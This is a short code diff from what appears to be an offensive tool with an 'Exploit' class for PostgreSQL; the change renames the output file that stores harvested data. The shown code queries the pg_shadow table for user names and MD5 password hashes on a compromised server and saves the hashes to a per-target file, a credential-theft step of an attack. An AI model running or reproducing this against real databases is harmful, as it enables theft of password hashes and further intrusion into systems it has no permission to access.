@@ -49,7 +49,7 @@ class postgresql(Exploit):
             # tries to possibly get md5 hashes if in case it is a superuser
             try:
                 cur.execute("select usename, passwd from pg_shadow")
-                with open(f"./data/{ip_address}_postgresql_md5.txt", "w") as text_file:
+                with open(f"./data/{ip_address}_{username}_postgresql_md5.txt", "w") as text_file:
                     for l in cur.fetchall():
                         if l[1]:
                             text_file.write(l[1] + "\n")
